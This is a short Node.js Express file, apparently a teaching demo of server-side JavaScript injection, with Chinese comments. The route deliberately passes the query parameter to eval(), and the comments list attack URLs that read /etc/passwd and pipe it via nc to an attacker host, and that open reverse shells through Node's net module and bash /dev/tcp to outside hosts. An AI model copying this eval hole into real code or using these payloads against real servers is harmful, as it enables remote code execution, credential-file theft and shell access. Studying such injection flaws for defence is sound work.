var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send('Hello' + eval(req.query.q));//eval 传入的参数可以执行
    console.log(req.query.q + '---' + eval(req.query.q));
});
app.listen(8080, function () {
    console.log('Example listening on port 8080!');
});

//任意文件读取
//http://localhost:8080/?q=require('child_process').exec('cat+/etc/passwd+|+nc+attackerip+80')
//http://localhost:8080/?q=require('moment').format('YYYY-MM-DD')

//GET SHELL
//http://localhost:8080/?q=var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attackerip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});

//GET SHELL2

//http://localhost:8080/?q=require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/wufeifei.com/7890 0>%261"')

//在服务器端写入一条数据